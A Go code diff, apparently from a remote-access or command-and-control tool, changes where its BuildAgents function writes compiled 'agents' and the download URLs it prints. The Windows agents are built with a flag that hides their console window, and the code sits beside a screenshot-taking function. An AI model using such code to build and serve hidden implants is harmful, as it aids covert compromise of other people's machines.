@@ -127,10 +127,10 @@ func TakeScrenshot(agent string, command []string) {
 
 func BuildAgents(agentName string, host string) {
 	path, _ := os.Getwd()
-	serverPath := filepath.Join(filepath.Dir(path), "agents", agentName)
+	outPath := filepath.Join(filepath.Dir(path), "drop", "agents", agentName)
 	agentPath := filepath.Join(filepath.Dir(path), "agent", "agent.go")
-	commands := [2]string{"GOOS=windows go build -ldflags -H=windowsgui  -o " + serverPath + ".exe " + agentPath,
-		"go build -o " + serverPath + " " + agentPath}
+	commands := [2]string{"GOOS=windows go build -ldflags -H=windowsgui  -o " + outPath + ".exe " + agentPath,
+		"go build -o " + outPath + " " + agentPath}
 	for _, command := range commands {
 		_, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
 		if err != nil {
@@ -139,7 +139,7 @@ func BuildAgents(agentName string, host string) {
 		}
 	}
 	fmt.Println()
-	fmt.Printf("[+] Agents URL:\n\t- %s/downloads/%s.exe\n\t- %s/downloads/%s", host, agentName, host, agentName)
+	fmt.Printf("[+] Agents URL:\n\t- %s/drop/agents/%s.exe\n\t- %s/drop/agents/%s", host, agentName, host, agentName)
 	fmt.Println()
 }
 
